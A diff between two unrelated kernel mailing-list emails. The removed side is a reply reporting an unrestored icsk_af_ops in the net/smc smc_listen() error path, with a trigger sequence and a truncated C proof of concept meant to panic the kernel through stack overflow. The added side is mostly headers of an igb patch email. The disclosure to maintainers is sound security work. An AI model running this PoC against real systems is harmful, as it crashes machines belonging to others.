@@ -1,330 +1,151 @@
-Received: from xmbghk7.mail.qq.com (xmbghk7.mail.qq.com [43.163.128.53])
+Received: from GVXPR05CU001.outbound.protection.outlook.com (mail-swedencentralazon11023089.outbound.protection.outlook.com [52.101.83.89])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DFC8836EA82;
-	Tue, 23 Jun 2026 10:38:39 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=43.163.128.53
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1782211124; cv=none; b=iU01o9v+u7cFaDIADPjwa7EAC+9ZnsdBSNx6SZQqqNYvSFB5zUq8sSjkdxQMpW5OZPQgIUmaugR0DjKGr6XMQGgArdfiQTDfHz3PWK8IyvBVbHfDJxMto7JUEtg7E6K4xrIFUHV1ldD5TKKfbom0qEQSFsZmkxgVdTl4UkJDcBQ=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1782211124; c=relaxed/simple;
-	bh=GjVvOsU1Va32xs+5yyrI198u+sBt/gwYvnYnzDA2i9s=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=pIz9hFqdpu88/DeZ8A2SOJwNWmyFjFDsGWqkMb1cFCDCcrpvFcPjJFgaFHVAgHl6gganHG/2r4qC1efNp/fuGmg86g8kkJvdgCwjAYFcFDhNiwtKsT3Pyh+3g+RflImgeeugTIRydEl/vhbP+9k7T0Q9y44KMYN/bMVtc53aanw=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=XDUMjlcf; arc=none smtp.client-ip=43.163.128.53
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A15FE36EA82;
+	Tue, 23 Jun 2026 10:38:52 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=52.101.83.89
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1782211138; cv=fail; b=X4ncnufrsxBJoFXVg/5B8knlh5BZhC8uqMaPTV6fNQNuYXdekUy5pTMmj8gMX9twgukHotDNv7HTwEA2DZqSuPUPNPb+6fNRPgOp5g1b1y3LyxpsnQFhVnFMAfur+faDviQrqE8XE2Obj0znC+nc9WRIDFRjj+OTxaJRTHQezEU=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1782211138; c=relaxed/simple;
+	bh=3YgDkJjidOCdRi2w+h22x6mUi3zGcKAZlqmxLYZpqWA=;
+	h=From:To:CC:Subject:Date:Message-ID:References:In-Reply-To:
+	 Content-Type:MIME-Version; b=Ung9qVeoDQy6+PthHpiRJ2xZLoy6mtSnNqeuzCKMFfrnxi3xPW8oKqVJGWkjSxrc9XpPbjvZB6amL5qOX+AJ4JrwmRpBOGQQVscF3jiUQM9tzCrNhVJlX8j/f3O0tE4l3TwLJj9YtqWUT2FzdulX/yCaKwaWiZIEwJeZwL4Cs00=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=aweta.nl; spf=pass smtp.mailfrom=aweta.nl; dkim=pass (2048-bit key) header.d=aweta.nl header.i=@aweta.nl header.b=Dp3lO4Kx; arc=fail smtp.client-ip=52.101.83.89
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=aweta.nl
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=aweta.nl
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="XDUMjlcf"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
-	t=1782211111; bh=xs46AWO9ZCWqHrnYArh0ceLaWQWFpRk9OCdge+m5N2w=;
-	h=Date:Subject:To:Cc:References:From:In-Reply-To;
-	b=XDUMjlcf60Tr9hYAqOlfcsrEDry44OFregDl4+NyW1KsiTMSCMpoVJPMRS81V+Hfj
-	 w4IMx/rWC7s7G3BpJqGEVZtvxwKr1aAR6Awa94s3h6OxYCizbzWJOnRtRKlxvijJnQ
-	 O1P53m5BzKby2j0+DjLme4pdWsHKVd80bxospmLo=
-Received: from [192.168.3.157] ([115.156.144.140])
-	by newxmesmtplogicsvrszb43-0.qq.com (NewEsmtp) with SMTP
-	id 99B3682F; Tue, 23 Jun 2026 18:38:27 +0800
-X-QQ-mid: xmsmtpt1782211107tosv0a42y
-Message-ID: <tencent_BD4B709F8D16281265EDBC0DC9EFC8758808@qq.com>
-X-QQ-XMAILINFO: NT7uTz3cNku2ya/XYiruYxjttnMLwzQWGrp3TXLfKnJRmYyas7J9vADMeBHY9Z
-	 vzA+6hfltpg13f6OYroTrrcSasXfXPhPXg11hAgoQhj1nHFGiHkaftrbfUSyIZ/7tnISZ+m/voBm
-	 j0EYQj9TeLu/Td0yAb4OpgBVRJsuanypwVmxHSUThIq5zDrx7roNICWxnKycTHbqjVMeimUwJ3pV
-	 J+czxbjINpo/FLuu4uZUMWcJeD+9PqNsFq+BFV/Y0sg5r/EZqSwhf0ulC3rugKEhcfdVjXpu8mTQ
-	 0lOt91Y/BtMSIi0mxEBCXnGn0zBvvJilnKJTLsC8jMrID9/lOwKsPkOcHyz4ei24PU8bfrkjuAU+
-	 qvL26gJUxmYXUyoxgn+1SEZJo1GXEf8byTxlKm2qP8eqKtB+ARgZIdUa9UxIhQ0C13h6axo06f+m
-	 ZEXkg/f8EHGlCk2sEfUs8LBMO8zV3HoXPS7Tz3bKnwXKsaBaSo4jiHZqU+7cu3PdtM3Ia86OyrzH
-	 70EK9qzT/2g9Qk4V3qk64KOcf7sig3mNWlTd+y5UReRs7NsPB0u7b/qwv0G8K8y6BVyuFFZvYPxT
-	 Vhm0UQ8OfCyeuWxt9tN2wt3EQNZrQcZLgIY29vsIMFWUiIcAO1KV571DwBhPHTRekHPI1t8G4ZzJ
-	 ZwH0gdKO4vJwdEhhI934kiJSiZdzbnFjNwWvLUMjpV3dJUV5tY5GtFUdhiXEgC0zHd1P6EtAelKx
-	 k22SPpeFy5hnBH+pyTsG6JLWcowe3poy50NhW/x5awKoW3UpYI//tzbitiBfVxzGHovGslC61GCZ
-	 gpLQpT3+hmgNYfaDCyJgIG9qbxwTXoIlwOGL1TfxYWXoC9k6SHWinJWdUSmOAg/iO2wZ1HAM3/Lf
-	 FVZvR0oF3HnU7IpSPe6hK5o5BqkOTlb9o/RCT/AkZ9S5ltEYX/VwLwFziQNdKyG1L4CC0SLN0V8W
-	 AU82NL49xYn7ah7H/dNJIh4EFRDuDJX4h/Q6ppef13fTznyg7MjrO969oJd4C+Xzn6pZB+FW79Cc
-	 4rN/NlalS4RhDLf9G7tHuyTvLmLUDrUnCBl3fi7iHphFKcTjm+DB8UMTG9emX9/puc3hesJmQCTb
-	 uI0TpJ0m5vGQ7Ur9s=
-X-QQ-XMRINFO: OWPUhxQsoeAVwkVaQIEGSKwwgKCxK/fD5g==
-X-OQ-MSGID: <360fe8a0-3a98-4010-83f3-3fc5d4062a3c@qq.com>
-Date: Tue, 23 Jun 2026 18:38:26 +0800
+	dkim=pass (2048-bit key) header.d=aweta.nl header.i=@aweta.nl header.b="Dp3lO4Kx"
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
+ b=G5OhBuqMBkoptzeXXZ4XiATqwhJ2widS4T+uQMrUvCjWoabEHJEZXJ3TEfM862uwBV+PNCcXaXENnj6kBz3qn5fHvlkn5zk24IRotaI8Ep8eM8R0YMOQjni61XLwwz1AotHHwRZLNSNX5ruPpdeeEnj7zM/UzGcoPZRyKpW9N8zXWlxuRaDOZBTYLW+Jb49WbIwLeYI6J3RaZ9dwgS4JD6am1Bby2lGMD1zSECUiTVKvIBY9CzI3FBTVIixt9wFBK1Wy03aD8r5sM6D9F33exs21TAzwOTiysHRNZbpOHARDf2VzbBmJHXzsoYCrYxrDJU206XFTZtt22gpJWSna1Q==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector10001;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=3YgDkJjidOCdRi2w+h22x6mUi3zGcKAZlqmxLYZpqWA=;
+ b=wP7zi9wQh2vRLK8sgpS+aeATQqJ+AWiExgTVsvECx+Zo+A9a0RutHsv3h5US9kxxmcD7RWe/VpxrFtlLXu1tQrG80kxKCO+ymW0X6pPQPRxiTGsnDHofwKTKDmS/yGkmAQQmDg1CQtHl5N/K1R3L9OKU+wL+K6ce+3b9siYzBYbTY6nOWr3nNES7UEe4c8EXRmnpygtdTTks7QyUF5eJhXgNc4i/87jTT3Em4jVa8DldvmRIjv4NH5FBTmwYeCEtVRToKOwAooNsunQMx0TXp7/v5Wm7PMgzFzTtMeca7Dkioz4AFfqZ68AUQ102CqRjG0mtP2mP89RHmUYI0rikBg==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=aweta.nl; dmarc=pass action=none header.from=aweta.nl;
+ dkim=pass header.d=aweta.nl; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=aweta.nl; s=selector1;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=3YgDkJjidOCdRi2w+h22x6mUi3zGcKAZlqmxLYZpqWA=;
+ b=Dp3lO4KxxAZY1rZnbMVj3onK+O6lAu1l0ACL5WunkcJKpVtQlvtuDJzqw0AJfwK8gvZVZSPFY7XjNtLL6ZQFzgjqbzPQtTpyvEAU+WADqKFhRTA9G5RvHtooM4KFoykDJy5BA47/AX1bpIwHEExbHGFLeadw0UFlCiTFgIzhUFGCAWJ8kOSH2s9ftSDjYdeTHCNRqXjyucVCi/y78C528PXnX7DPsNVDCLVqpew+Ffz02aOtRtsN8/wTI9M58tdi0bI2ILSs5fClFNUcl4FI63Z8J+7GPtKZ3ryLw8yJ1OaAlKf99Lx46uPTXKdYywzzYrTeSSVAFGyegO0oxPVjYA==
+Received: from PAWPR05MB10691.eurprd05.prod.outlook.com (2603:10a6:102:35a::6)
+ by DB5PR05MB10720.eurprd05.prod.outlook.com (2603:10a6:10:48a::7) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.21.139.20; Tue, 23 Jun
+ 2026 10:38:48 +0000
+Received: from PAWPR05MB10691.eurprd05.prod.outlook.com
+ ([fe80::3b9c:573e:3c13:3754]) by PAWPR05MB10691.eurprd05.prod.outlook.com
+ ([fe80::3b9c:573e:3c13:3754%6]) with mapi id 15.21.0139.009; Tue, 23 Jun 2026
+ 10:38:48 +0000
+From: Tjerk Kusters <tkusters@aweta.nl>
+To: "Kwapulinski, Piotr" <piotr.kwapulinski@intel.com>, "Nguyen, Anthony L"
+	<anthony.l.nguyen@intel.com>, "Kitszel, Przemyslaw"
+	<przemyslaw.kitszel@intel.com>, Andrew Lunn <andrew+netdev@lunn.ch>, "David
+ S. Miller" <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>, Jakub
+ Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, Richard Cochran
+	<richardcochran@gmail.com>, Jesper Dangaard Brouer <hawk@kernel.org>, Kurt
+ Kanzenbach <kurt@linutronix.de>
+CC: "intel-wired-lan@lists.osuosl.org" <intel-wired-lan@lists.osuosl.org>,
+	"netdev@vger.kernel.org" <netdev@vger.kernel.org>,
+	"linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>,
+	"stable@vger.kernel.org" <stable@vger.kernel.org>
+Subject: RE: [Intel-wired-lan] [PATCH net v2] igb: only strip Rx timestamp
+ header on the first buffer of a frame
+Thread-Topic: [Intel-wired-lan] [PATCH net v2] igb: only strip Rx timestamp
+ header on the first buffer of a frame
+Thread-Index: AQHc/7tT1+QLGKmA6E2ZCaRCpSVOLLZL8HGAgAAG4rA=
+Date: Tue, 23 Jun 2026 10:38:48 +0000
+Message-ID:
+ <PAWPR05MB106916E499B9B12E25F1A654FB9EE2@PAWPR05MB10691.eurprd05.prod.outlook.com>
+References: <20260619-igb-rx-ts-fix-v2-1-d3b8d605ca62@aweta.nl>
+ <BL1PR11MB59792FC9956781218FC85B66F3EE2@BL1PR11MB5979.namprd11.prod.outlook.com>
+In-Reply-To:
+ <BL1PR11MB59792FC9956781218FC85B66F3EE2@BL1PR11MB5979.namprd11.prod.outlook.com>
+Accept-Language: en-US, nl-NL
+Content-Language: en-US
+X-MS-Has-Attach:
+X-MS-TNEF-Correlator:
+authentication-results: dkim=none (message not signed)
+ header.d=none;dmarc=none action=none header.from=aweta.nl;
+x-ms-publictraffictype: Email
+x-ms-traffictypediagnostic: PAWPR05MB10691:EE_|DB5PR05MB10720:EE_
+x-ms-office365-filtering-correlation-id: d22f6831-5be4-42f9-b5ff-08ded1139bfe
+x-ms-exchange-senderadcheck: 1
+x-ms-exchange-antispam-relay: 0
+x-microsoft-antispam:
+ BCL:0;ARA:13230040|23010399003|376014|1800799024|7416014|366016|921020|18002099003|22082099003|4143699003|56012099006|38070700021;
+x-microsoft-antispam-message-info:
+ MfeP1/g+Cs3M/x88/w5aHRVKbABBuhL8jgVC4SKcB9KvcZUSqA79hU4qHvRDz8qLJ9khwc/o0Cv5XmW/DLYfqriS7PHHySFwp7h0j898adbAgEB+Ay/SUx7lct+jGYyQXAHZvq+tcMLlkm7rASja6gDEJ88btSNzz5y8JD2lrY7wUuz392fM61eGUuI8K6dboF18Y3EGmsmvutkcmdtYkXZ7jo9Dw72YkMJdyktatxF+4eP/uog7Zu5BI+rqundW4syEuFblK6HwTkgZDQ5m5W7OG2zZQas4Bxsw4vn+60LIoiwozIbQ57S2/fTpwT3l69U8wD+J6OdJ+wv70eB8LgNAGjALyh4Ocot2NWi5jWdaf90I5YmPoyy0o5FeR6DKCgoAwPS48XBHKh//GFSt2qPdSPl6XMnO06thBZ1nD3o3bGzUN6QgyaB7pOtO26aPfvjaczz8jEgrAtE0NY3PwZfSpxEFBDw1ahfCsLvnlp+JYYD9XaQVxiFJyfMnOscPRkS3+S/uvxXFENjUu14s0lnz7BhF9mRHRlgEvzi9iAi0g0JeFXLoisTUQUmEYAZY/bz7ldxpaUwBmgbb2i+8eMEe+38xWtI/vkqHMrm8JgPZJhFJhc8xyAoBKqIi5LBPkg10LMX7LL2ERAU+Fqepg5nrTvgx3DzVa7SnPbMpgsHpKh1ADOVl91jTTGov7lECgeqQr7FryOYd3HawDE8zF4V27uHZQAzRmItVdBl5Ha2C8Al+fPc4KGxkvvo9mUlR
+x-forefront-antispam-report:
+ CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:PAWPR05MB10691.eurprd05.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(23010399003)(376014)(1800799024)(7416014)(366016)(921020)(18002099003)(22082099003)(4143699003)(56012099006)(38070700021);DIR:OUT;SFP:1102;
+x-ms-exchange-antispam-messagedata-chunkcount: 1
+x-ms-exchange-antispam-messagedata-0:
+ =?utf-8?B?SGVyY3VSU3o4Ukc1RnJFWTR4emZ4MFdqNHFoUm1jc1JLZkM1cXR6NXNsblNo?=
+ =?utf-8?B?WTgwK2RlL2tSa25FdCtnaUR4SHZSbXJGWnpJSDNMQlQrSGxzSEhWUTJ1cXVi?=
+ =?utf-8?B?US9qc3d0NDRiRHNyR2RpUFZ2THQ1Tk02UXAxN1pvUC9zTTluVXpjS3M5TTZC?=
+ =?utf-8?B?Z2srUjUrNXhVc0VJTThrTExTbW1jMkxGR1VTSFJiL0tUUkZscW5WNGcvaXU0?=
+ =?utf-8?B?bGoxMTBncE9lZFZndlBVZDIzaU5TV0xxQ2hjSGdlQ1l4NDUxK2hKNG1qVW14?=
+ =?utf-8?B?RTE4OEtHZW9MQTJJRC9PZGZqRTJveVp2NmtLWmw2YkhLbFg3czZDUlVPNlp1?=
+ =?utf-8?B?NHRYTXFPRFp1QnEzbzNjOFRROGdjMFFxa3l3OWh5VlVnM0kxVFduQmpOQ09N?=
+ =?utf-8?B?eUVUWnVQTC9YUnE5OTJTT0ZZTGg4Sm1iU0ZicTFRUVNFMFM0cEhPUTRESWpY?=
+ =?utf-8?B?R3RGOUU3cnArY2dDYWl4Y2lNVVJuZlJSYVlQdEg5S1BMUWdiR1ZoVE5nR3dz?=
+ =?utf-8?B?UGRBNFd2QlhEbUFyQVVSWDYzMmtlZFM0OUxyb0NVUmJIMkRVVENTa1hIdEZp?=
+ =?utf-8?B?ditXSmNLWTh3RzJsOHh5UXF0VE0xRjdFYmE5cnVFRmdDOGR6Mzk2cGU2MUxH?=
+ =?utf-8?B?YStrMGhBZDM2Y3FwQ2lSNTNvTG1DWER0dlZOS2JkWTNyZ2ROWW1mMUlJMVdK?=
+ =?utf-8?B?akt4VWdnelZYdkZQK1hxZEZ0UWZ0SFlLV1p5UHVSMVdMZ0U2THpwR1I3WkhY?=
+ =?utf-8?B?L1g4YWVsWkRRY3JkV3AwT0JMK2l0Snljd0ZyOEphYlkvU3dYd1lwZG9WdjBW?=
+ =?utf-8?B?b2VOM0w3NW1OdmJMUTZXeGZsVUdsblcvd2xNeHZQOTJYZGZKVVNSWFhMcFNw?=
+ =?utf-8?B?TEE1MC9VcURjQUxheEZMdnFtUzF3UmFObjA1dDhTYVBTQnU2dFptVVFwd1Bx?=
+ =?utf-8?B?eTVQaVRrNG1jakdqRE5tM3dTUkkrbTl6TThJZzN2U0ZEMThwVGVGeFViQWZo?=
+ =?utf-8?B?QXEvYlIxZi9ya1hkSjVDSkYySGtNKzdHbzl0Sk4wQVFXTG5zQzNSSWp3Qm5p?=
+ =?utf-8?B?azNFQTRSYUI1TExXMGtrQlNsVXBXYzlXM2NjbFY1c1ZOWldONDRueU9Qd3V3?=
+ =?utf-8?B?MElaMmZucUdlcStpOGh3dTNzWFNhcVFEaW5VUGFtUDNLcUZ5ajJpUUJyU3J2?=
+ =?utf-8?B?cVFpbFZicUNFNHh0WTk0R0FBcy9hTVdVWHhtdWxpa283NFNRZEZxWWdCK245?=
+ =?utf-8?B?SURQVG40L0drcURLSncwTXdlVmxGRm5FaGQzQjIvS2JXZXQzTTcwTTJQbXZw?=
+ =?utf-8?B?YXlSdUhpRjZCNktLWXlKRVdHanRFeWxQRUgra016ajhvRlg3TFBuZ0R2Z0w5?=
+ =?utf-8?B?dlMxSmhFNUhFN1JkbmNibGpDNlFJNXRpRkI5UGFqK2ZrcUgwY2VBUkd0QVE0?=
+ =?utf-8?B?NVY2bXpzSnBNUnhrbzlvemxPZmlWSVYzaWFhNEZHNVp4d3V3VW1zT0NWVTYx?=
+ =?utf-8?B?ME9zTjB4Q1kwRnJaOUJtTktXT0J3RTE0YU1PQ0xSeVNDQVp0RkdRcFdHZ1p0?=
+ =?utf-8?B?NFd4R1BaRGRGWkxkUE5zYU50VVB1ck9KcVh6eWVSUnl1MDJPSkREYm9xTC9V?=
+ =?utf-8?B?UG5VV2EzdUorVkQweC9UYzRIYlp1SGhySzhSUnhtQTdta0xVclcyaHRKLzNF?=
+ =?utf-8?B?ZnFqbHNPMVQzRDRLbkFaTnpEZDBIb1VzSGNuaWxhYm1BcHRQb1ZZTG82Q3Rx?=
+ =?utf-8?B?cUdCWmZvaEdKK0FSbHA4cU5nSGhJL1IvcWV4dGxES1hERWNJSi9XaUlHWXBZ?=
+ =?utf-8?B?dnd5WWRsa2crallrbzNXazBhL1pBZkpEenZhUVk3eVFuNDNwMmp6ZzZ6eUFY?=
+ =?utf-8?B?WGZLY3l0RjJUUmdzcHFBYU11bGtQcUc1L0xUNmY4WDBSL2lpRFZTSlFaNzBZ?=
+ =?utf-8?B?M1lLS1RWSTU4VU9XeElOSWlwemlUVTZjM254ZU9RNkxNbVhYMVhRNzVoMGhy?=
+ =?utf-8?B?ZjUyb1dFanhsTXpLOUttRzUzRzVrbUdVR0hsZHVvdGJreE1zVHZJZk10MkFU?=
+ =?utf-8?B?dnF1a3h2WE9TcHByL2VMTC9SUDlTTGJ0YklRSEdDZW8valpobm5IaHpJVDls?=
+ =?utf-8?B?VWFnckx2VSt6QjZYUzkrYWVxSkR2bXVCZEZyWkx2a214OStHUHJvVUg3VDRq?=
+ =?utf-8?B?MlZVK3JXRmE4RDRkN0dWS3NxNStqT1Zkd0R3WHErQVpIa3NBQ1IybG1iVFZu?=
+ =?utf-8?B?TEhjeElnc3F3dDIvYWJiOWROOU4vaEZZVGRQMWtPd3duMDdKOVRKM01ITHNa?=
+ =?utf-8?Q?G785SXtIFDG5Qx87Na?=
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: base64
 Precedence: bulk
 X-Mailing-List: stable@vger.kernel.org
 List-Id: <stable.vger.kernel.org>
 List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH net v2] net/smc: avoid recursive sk_callback_lock in
- listen data_ready
-To: Runyu Xiao <runyu.xiao@seu.edu.cn>, "D. Wythe"
- <alibuda@linux.alibaba.com>, Dust Li <dust.li@linux.alibaba.com>,
- Sidraya Jayagond <sidraya@linux.ibm.com>, Wenjia Zhang
- <wenjia@linux.ibm.com>, "David S. Miller" <davem@davemloft.net>,
- Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>,
- Paolo Abeni <pabeni@redhat.com>
-Cc: Mahanta Jambigi <mjambigi@linux.ibm.com>,
- Tony Lu <tonylu@linux.alibaba.com>, Wen Gu <guwen@linux.alibaba.com>,
- Simon Horman <horms@kernel.org>, Karsten Graul <kgraul@linux.ibm.com>,
- linux-rdma@vger.kernel.org, linux-s390@vger.kernel.org,
- netdev@vger.kernel.org, linux-kernel@vger.kernel.org, jianhao.xu@seu.edu.cn,
- stable@vger.kernel.org
-References: <20260617152855.1039151-1-runyu.xiao@seu.edu.cn>
- <20260619054815.176764-1-runyu.xiao@seu.edu.cn>
-From: XIAO WU <xiaowu.417@qq.com>
-In-Reply-To: <20260619054815.176764-1-runyu.xiao@seu.edu.cn>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 8bit
+X-OriginatorOrg: aweta.nl
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-AuthSource: PAWPR05MB10691.eurprd05.prod.outlook.com
+X-MS-Exchange-CrossTenant-Network-Message-Id: d22f6831-5be4-42f9-b5ff-08ded1139bfe
+X-MS-Exchange-CrossTenant-originalarrivaltime: 23 Jun 2026 10:38:48.4346
+ (UTC)
+X-MS-Exchange-CrossTenant-fromentityheader: Hosted
+X-MS-Exchange-CrossTenant-id: 6546512a-ba20-41bf-9d8d-c076dcbf6fd9
+X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
+X-MS-Exchange-CrossTenant-userprincipalname: JtFBmtH8ondFQ9cx04zbv67RXCZSnchZdObfx+cu/s+0ELXFC9MzS1VhziPtiZtFmQF8UZtxBkA+I4cVUBW54g==
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: DB5PR05MB10720
 
-Hi Runyu,
-
-Thanks for this patch.
-
- > diff --git a/net/smc/af_smc.c b/net/smc/af_smc.c
- > index 6421c2e1c84d..1af4e3c333ff 100644
- > --- a/net/smc/af_smc.c
- > +++ b/net/smc/af_smc.c
- > @@ -2631,6 +2631,9 @@ static void smc_clcsock_data_ready(struct sock 
-*listen_clcsock)
- >  {
- >      struct smc_sock *lsmc;
- >
- > +    if (READ_ONCE(listen_clcsock->sk_state) != TCP_LISTEN)
- > +        return;
- > +
- >      read_lock_bh(&listen_clcsock->sk_callback_lock);
- >      lsmc = smc_clcsock_user_data(listen_clcsock);
-
-The TCP_LISTEN check before taking sk_callback_lock looks correct and
-mirrors the same pattern from nvmet TCP.
-
-Sashiko AI review also looked at this patch and flagged a separate
-pre-existing issue nearby — the error path in smc_listen() does not
-restore icsk_af_ops when kernel_listen() fails:
-
-https://sashiko.dev/#/patchset/20260617152855.1039151-1-runyu.xiao@seu.edu.cn
-
-The relevant code in smc_listen() (net/smc/af_smc.c, lines ~2687-2704):
-
-         smc->ori_af_ops = inet_csk(smc->clcsock->sk)->icsk_af_ops;
-
-         smc->af_ops = *smc->ori_af_ops;
-         smc->af_ops.syn_recv_sock = smc_tcp_syn_recv_sock;
-
-         inet_csk(smc->clcsock->sk)->icsk_af_ops = &smc->af_ops;
-
-         if (smc->limit_smc_hs)
-                 tcp_sk(smc->clcsock->sk)->smc_hs_congested = 
-smc_hs_congested;
-
-         rc = kernel_listen(smc->clcsock, backlog);
-         if (rc) {
-write_lock_bh(&smc->clcsock->sk->sk_callback_lock);
-smc_clcsock_restore_cb(&smc->clcsock->sk->sk_data_ready,
-  &smc->clcsk_data_ready);
-                 rcu_assign_sk_user_data(smc->clcsock->sk, NULL);
-write_unlock_bh(&smc->clcsock->sk->sk_callback_lock);
-                 goto out;
-         }
-
-The error path restores sk_data_ready and sk_user_data but leaves
-icsk_af_ops pointing to &smc->af_ops (whose syn_recv_sock is already
-set to smc_tcp_syn_recv_sock).  I verified this in a QEMU VM and can
-confirm it triggers a real kernel stack overflow.
-
-=== Reproduction ===
-
-Kernel: 7.1.0-rc7-gfa471042f07a #1 SMP PREEMPT_DYNAMIC x86_64
-Config: ci-qemu-upstream.config (KASAN=y, CONFIG_SMC=y, DEBUG_LIST=y)
-QEMU: qemu-system-x86_64 -m 2G -smp 2
-
-Trigger sequence:
-   1. SMC socket A: setsockopt(SO_REUSEADDR), bind to port P
-      → clcsock gets SO_REUSEADDR via smc_bind() copy
-   2. TCP socket C: setsockopt(SO_REUSEADDR), bind + listen on port P
-      → Both non-TCP_LISTEN at bind time → bind OK
-      → C enters TCP_LISTEN after its listen()
-   3. listen(A) on SMC → kernel_listen() fails with EADDRINUSE
-      → icsk_af_ops NOT restored → clcsock points to wrapper
-   4. Close TCP C (free port), listen(A) again → succeeds
-      → ori_af_ops now points to wrapper with syn_recv_sock = 
-smc_tcp_syn_recv_sock
-   5. TCP connect() to port P → smc_tcp_syn_recv_sock calls itself
-      → infinite recursion → IRQ stack guard page hit → kernel panic
-
-=== Full PoC ===
-
-Compile with: gcc -o poc poc.c -static
-
-// PoC: Stack overflow via corrupted icsk_af_ops in smc_listen error path
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <errno.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <sys/wait.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-
-#ifndef PF_SMC
-#define PF_SMC 43
-#endif
-#ifndef SMCPROTO_SMC
-#define SMCPROTO_SMC 0
-#endif
-
-int main(void)
-{
-     int smc_a, tcp_c, client;
-     struct sockaddr_in addr;
-     pid_t child;
-     int status, ret;
-     socklen_t len;
-     int val;
-
-     printf("=== SMC listen error path -> stack overflow PoC ===\n\n");
-
-     /* Step 1: SMC socket A with SO_REUSEADDR, bind to any free port */
-     printf("[1] Create SMC socket A with SO_REUSEADDR\n");
-     smc_a = socket(PF_SMC, SOCK_STREAM, 0);
-     if (smc_a < 0) { perror("smc socket"); return 1; }
-     val = 1;
-     setsockopt(smc_a, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
-
-     memset(&addr, 0, sizeof(addr));
-     addr.sin_family = AF_INET;
-     addr.sin_addr.s_addr = htonl(INADDR_ANY);
-     addr.sin_port = 0;
-     if (bind(smc_a, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-         perror("bind smc_a"); close(smc_a); return 1;
-     }
-     len = sizeof(addr);
-     if (getsockname(smc_a, (struct sockaddr *)&addr, &len) < 0) {
-         perror("getsockname"); close(smc_a); return 1;
-     }
-     int port = ntohs(addr.sin_port);
-     printf("  SMC A bound to port %d\n", port);
-
-     /* Step 2: TCP socket C with SO_REUSEADDR, bind+listen on same port */
-     printf("[2] TCP C with SO_REUSEADDR, bind+listen on port %d\n", port);
-     tcp_c = socket(AF_INET, SOCK_STREAM, 0);
-     val = 1;
-     setsockopt(tcp_c, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
-     memset(&addr, 0, sizeof(addr));
-     addr.sin_family = AF_INET;
-     addr.sin_addr.s_addr = htonl(INADDR_ANY);
-     addr.sin_port = htons(port);
-     if (bind(tcp_c, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-         perror("bind tcp_c"); close(tcp_c); close(smc_a); return 1;
-     }
-     if (listen(tcp_c, 5) < 0) {
-         perror("listen tcp_c"); close(tcp_c); close(smc_a); return 1;
-     }
-     printf("  TCP C listening on port %d\n", port);
-
-     /* Step 3: listen(A) should FAIL → icsk_af_ops NOT restored */
-     printf("[3] listen(SMC A) — expect failure... ");
-     fflush(stdout);
-     ret = listen(smc_a, 5);
-     if (ret == 0) {
